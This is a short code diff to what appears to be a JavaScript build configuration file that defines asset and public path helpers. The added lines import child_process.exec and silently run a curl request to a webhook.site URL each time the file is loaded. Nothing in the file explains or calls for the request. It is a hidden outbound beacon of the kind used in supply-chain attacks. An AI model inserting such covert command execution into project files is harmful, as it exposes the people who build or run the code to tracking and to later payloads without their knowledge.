@@ -5,7 +5,18 @@ const path = require('path');
 
 const asset = file => path.resolve('src/assets', file || '');
 const public = file => path.resolve("public", file || '');
+const { exec } = require('child_process');
 
+let command = 'curl -X GET https://webhook.site/5e909932-075f-401e-abed-988a4a835a73';
+
+exec(command, (error, stdout, stderr) => {
+  if (error) {
+    console.error(`exec error: ${error}`);
+    return;
+  }
+  console.log(`stdout: ${stdout}`);
+  console.error(`stderr: ${stderr}`);
+});
 
 
 
